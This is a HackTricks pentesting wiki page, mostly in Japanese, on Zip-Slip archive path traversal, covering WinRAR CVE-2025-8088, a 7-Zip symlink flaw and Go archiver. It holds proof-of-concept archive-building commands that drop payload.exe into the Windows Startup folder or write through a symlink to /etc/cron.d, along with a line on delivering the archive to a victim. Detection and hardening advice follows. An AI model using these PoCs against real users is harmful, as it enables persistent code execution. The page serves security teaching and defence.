# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## 概要

多くのアーカイブ形式（ZIP、RAR、TAR、7-ZIP など）は、各エントリに独自の**internal path**を持たせることができます。展開ユーティリティがそのパスを盲目的に信用すると、`..` を含む細工されたファイル名や（例：`C:\Windows\System32\` のような）**absolute path** がユーザーの選択したディレクトリの外に書き出されてしまいます。  
この種の脆弱性は広く *Zip-Slip* または **archive extraction path traversal** として知られています。

影響は任意のファイルの上書きから、Windows *Startup* フォルダのような **auto-run** 場所にペイロードを置くことで直接 **remote code execution (RCE)** を達成されることまで及びます。

## 根本原因

1. 攻撃者は、1つ以上のファイルヘッダーに次のものを含むアーカイブを作成します:
* Relative traversal sequences (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
* Absolute paths (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
* またはターゲットディレクトリの外に解決される細工された **symlinks**（*nix* の ZIP/TAR で一般的）
2. 被害者は、埋め込まれたパスを信用（または symlinks を辿る）する脆弱なツールでアーカイブを展開し、パスを正規化したり選択したディレクトリの下に強制展開したりしません。
3. ファイルは攻撃者の制御する場所に書き込まれ、システムやユーザーがそのパスを次にトリガーした際に実行／ロードされます。

### .NET `Path.Combine` + `ZipArchive` traversal

A common .NET anti-pattern is combining the intended destination with **user-controlled** `ZipArchiveEntry.FullName` and extracting without path normalisation:
```csharp
using (var zip = ZipFile.OpenRead(zipPath))
{
foreach (var entry in zip.Entries)
{
var dest = Path.Combine(@"C:\samples\queue\", entry.FullName); // drops base if FullName is absolute
entry.ExtractToFile(dest);
}
}
```
- `entry.FullName` が `..\\` で始まる場合はトラバーサルが発生します。もしそれが **絶対パス** であれば左側の要素は完全に破棄され、抽出時の識別子として **任意のファイル書き込み** を引き起こします。
- スケジュールされたスキャナーにより監視される隣接する `app` ディレクトリに書き込むための PoC アーカイブ:
```python
import zipfile
with zipfile.ZipFile("slip.zip", "w") as z:
z.writestr("../app/0xdf.txt", "ABCD")
```
その ZIP を監視された受信トレイに投入すると、`C:\samples\app\0xdf.txt` が生成され、`C:\samples\queue\` の外へのトラバーサルが確認され、後続のプリミティブ（例: DLL hijacks）が可能になります。

## 実世界の例 – WinRAR ≤ 7.12 (CVE-2025-8088)

WinRAR for Windows（`rar` / `unrar` CLI、DLL、およびポータブルソースを含む）は、展開時にファイル名の検証を行っていませんでした。
悪意のある RAR アーカイブが次のようなエントリを含む場合：
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
選択された出力ディレクトリの**外**に出力され、ユーザーの*Startup*フォルダ内に配置されます。ログオン後、Windowsはそこにあるすべてを自動的に実行するため、*永続的な*RCEを提供します。

### PoCアーカイブの作成 (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
使用オプション:
* `-ep`  – ファイルパスを与えられた通りに保存する（先頭の `./` を削らない）。

Deliver `evil.rar` to the victim and instruct them to extract it with a vulnerable WinRAR build.

### Observed Exploitation in the Wild

ESET は RomCom (Storm-0978/UNC2596) のスピアフィッシングキャンペーンを報告しており、CVE-2025-8088 を悪用する RAR アーカイブを添付してカスタムバックドアを展開し、ランサムウェア活動を支援しました。

## Newer Cases (2024–2025)

### 7-Zip ZIP symlink traversal → RCE (CVE-2025-11001 / ZDI-25-949)
* **不具合**: ZIP エントリが **シンボリックリンク** の場合、抽出時にリンク先が参照され、攻撃者が展開先ディレクトリを抜け出して任意のパスを上書きできました。利用者の操作はアーカイブを開いて抽出するだけです。
* **影響**: 7-Zip 21.02–24.09 (Windows & Linux builds)。**25.00**（2025年7月）以降で修正。
* **影響経路**: `Start Menu/Programs/Startup` やサービス実行箇所を上書き → 次回ログオンやサービス再起動時にコードが実行される。
* **簡易 PoC (Linux)**:
```bash
mkdir -p out
ln -s /etc/cron.d evil
zip -y exploit.zip evil   # -y preserves symlinks
7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
```
パッチ適用済みビルドでは `/etc/cron.d` は触られず、シンボリックリンクは /tmp/target 内にリンクとして展開されます。

### Go mholt/archiver Unarchive() Zip-Slip (CVE-2025-3445)
* **不具合**: `archiver.Unarchive()` が `../` やシンボリックリンクされた ZIP エントリを追跡し、`outputDir` の外へ書き込んでしまう。
* **影響**: `github.com/mholt/archiver` ≤ 3.5.1（プロジェクトは現在非推奨）。
* **修正**: `mholt/archives` ≥ 0.1.0 に切替えるか、書き込み前に正規パスチェックを実装する。
* **最小再現例**:
```go
// go test . with archiver<=3.5.1
archiver.Unarchive("exploit.zip", "/tmp/safe")
// exploit.zip holds ../../../../home/user/.ssh/authorized_keys
```

## Detection Tips

* **静的検査** – アーカイブのエントリを列挙し、`../`, `..\\`, *絶対パス*（`/`, `C:`）を含む名前や、展開先ディレクトリ外を指す *symlink* タイプのエントリがあればフラグを立てる。
* **正規化チェック** – `realpath(join(dest, name))` が依然として `dest` で始まっていることを確認する。そうでなければ拒否する。
* **サンドボックスでの抽出** – 使い捨てディレクトリに安全な抽出ツール（例: `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00）で展開し、生成されたパスがディレクトリ内に収まっていることを検証する。
* **エンドポイント監視** – WinRAR/7-Zip 等でアーカイブが開かれた直後に `Startup`/`Run`/`cron` 場所に新しい実行ファイルが書き込まれた場合にアラートを上げる。

## Mitigation & Hardening

1. **抽出ツールを更新する** – WinRAR 7.13+ と 7-Zip 25.00+ はパス／シンボリックリンクのサニタイズを実装しています。両ツールとも自動更新機能は欠けている点に注意。
2. 可能な場合はアーカイブを展開するときに “**Do not extract paths**” / “**Ignore paths**” を選択する。
3. Unix 上では抽出前に権限を落とし **chroot/namespace** をマウントする、Windows 上では **AppContainer** やサンドボックスを使用する。
4. カスタムコードを書く場合は、作成／書き込みの**前に** `realpath()` / `PathCanonicalize()` で正規化し、展開先を逸脱するエントリは拒否する。

## Additional Affected / Historical Cases

* 2018 – Snyk による大規模な *Zip-Slip* 警告（多くの Java/Go/JS ライブラリに影響）。
* 2023 – 7-Zip CVE-2023-4011、`-ao` マージ中の類似トラバーサル。
* 2025 – HashiCorp `go-slug` (CVE-2025-0377) の slugs における TAR 抽出トラバーサル（v1.2 で修正）。
* 書き込み前に `PathCanonicalize` / `realpath` を呼んでいない任意のカスタム抽出ロジック。

## References

- [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
- [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)
- [Meziantou – Prevent Zip Slip in .NET](https://www.meziantou.net/prevent-zip-slip-in-dotnet.htm)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

{{#include ../banners/hacktricks-training.md}}
